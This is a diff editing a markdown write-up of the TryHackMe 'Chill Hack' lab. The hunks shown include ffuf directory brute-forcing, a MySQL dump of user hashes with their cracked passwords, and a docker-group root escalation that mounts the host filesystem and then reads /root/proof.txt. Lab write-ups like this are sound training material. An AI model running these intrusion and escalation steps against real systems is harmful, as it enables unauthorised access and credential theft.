@@ -1,14 +1,11 @@
-<div align="center">
+# 🧊 Chill Hack: Easy
 
-# 🧊 Chill Hack
 ### TryHackMe Writeup
 
-![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
-![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)
-![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)
-
-</div>
+[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
+[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
+[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
+[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)
 
 ---
 
@@ -57,7 +54,7 @@ Intel drop: there's a command execution endpoint somewhere with a blacklist. Two
 ### Directory Bruteforce
 
 ```bash
-ffuf -u http://chill.thm/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic -o raft-med-dir
+ffuf -u http://chill.thm/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic
 ```
 
 Notable hit: `/secret/` — a command execution form.
@@ -183,7 +180,7 @@ mysql -h localhost -u root -p
 ```
 
 ```sql
-SELECT * FROM users;
+SELECT user_login, user_pass, user_nicename FROM users;
 -- Aurick    | 7e53614ced3640d5de23f111806cc4fd  → masterpassword
 -- cullapaar | 686216240e5af30df0501e53c789a649  → dontaskdonttell
 ```
@@ -233,8 +230,6 @@ Docker group membership is equivalent to root. Spun up an Alpine container with 
 ```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
 ```
-
-Full host filesystem access as root inside the container. Navigated directly to `/root`:
 
 ```bash
 cat /root/proof.txt
